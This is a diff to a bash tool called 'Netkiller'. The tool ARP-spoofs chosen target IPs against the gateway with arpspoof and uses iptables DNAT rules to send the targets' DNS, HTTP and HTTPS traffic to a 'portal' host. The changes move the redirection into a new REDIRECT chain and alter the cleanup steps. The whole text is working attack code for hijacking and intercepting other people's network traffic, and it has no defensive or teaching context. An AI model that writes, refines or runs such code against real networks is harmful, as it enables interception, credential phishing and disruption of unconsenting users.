@@ -24,6 +24,7 @@ fi
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
 iptables -t nat -N CLIENTS
+iptables -t nat -N REDIRECT
 echo " "
 
 # Functions for clean up
@@ -36,8 +37,8 @@ echo -e "\nUnblocking network devices..."
 pkill -f arpspoof
 pkill arpspoof
 ip -s -s neigh flush all >/dev/null 2>&1
-iptables -t nat -F PREROUTING
 iptables -t nat -X CLIENTS
+iptables -t nat -X REDIRECT 
 sleep 2
 echo -e "\nConnection is restored..."
 EOF
@@ -102,15 +103,8 @@ echo "[*] TARGETS:   | $SUB"
 echo "[*] PORTAL:    | $PORTAL"
 echo " "
 
-# Redirect DNS traffic for clients
-iptables -t nat -A PREROUTING -j CLIENTS -p udp --dport 53 -j DNAT --to-destination $PORTAL:53
-iptables -t nat -A PREROUTING -j CLIENTS -p tcp --dport 53 -j DNAT --to-destination $PORTAL:53
-
-# Redirect HTTP traffic for clients
-iptables -t nat -A PREROUTING -j CLIENTS -p tcp --dport 80 -j DNAT --to-destination $PORTAL:80
-
-# Redirect HTTPS traffic for clients
-iptables -t nat -A PREROUTING -j CLIENTS -p tcp --dport 443 -j DNAT --to-destination $PORTAL:443
+iptables -t nat -A REDIRECT -p tcp -m multiport --dports 53,80,443 -j DNAT --to-destination $PORTAL
+iptables -t nat -A REDIRECT -p udp --dport 53 -j DNAT --to-destination $PORTAL:53
 
 # Prompt the user for confirmation
 read -p "[*] Do you want to scan the network? (y/n) " -n 1 -r
@@ -248,7 +242,7 @@ echo " "
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
-     iptables -t nat -A CLIENTS -s "$TARGET" -j RETURN
+     iptables -t nat -A CLIENTS -s "$TARGET" -j REDIRECT
 done
 echo " "
 echo "To stop Netkiller, run: netkiller-stop"
